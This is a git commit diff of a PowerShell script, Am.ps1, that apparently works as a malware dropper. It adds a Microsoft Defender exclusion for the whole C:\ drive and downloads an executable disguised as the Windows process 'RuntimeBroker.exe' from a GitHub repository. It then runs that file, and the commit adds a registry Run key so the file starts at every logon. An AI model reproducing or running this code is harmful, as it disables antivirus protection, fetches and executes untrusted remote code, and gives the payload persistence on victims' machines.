a4deaa9a913eed9da250a5b33cfd821dec321959
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-08 12:43:43 -0800

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -1,5 +1,11 @@
-Add-MpPreference -ExclusionPath C:\
+Add-MpPreference -ExclusionPath "C:\"
+
 $url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/RuntimeBroker.exe"
-$output = "$env:Temp/RuntimeBroker.exe"
+$output = "$env:Temp\RuntimeBroker.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process -FilePath $output
+
+$startupPath = [System.Environment]::GetFolderPath('ApplicationData') + "\SubDir\Runtime broker.exe"
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+New-ItemProperty -Path $regKey -Name "RuntimeBroker" -Value $startupPath -PropertyType String -Force
+
+Start-Process -FilePath $startupPath
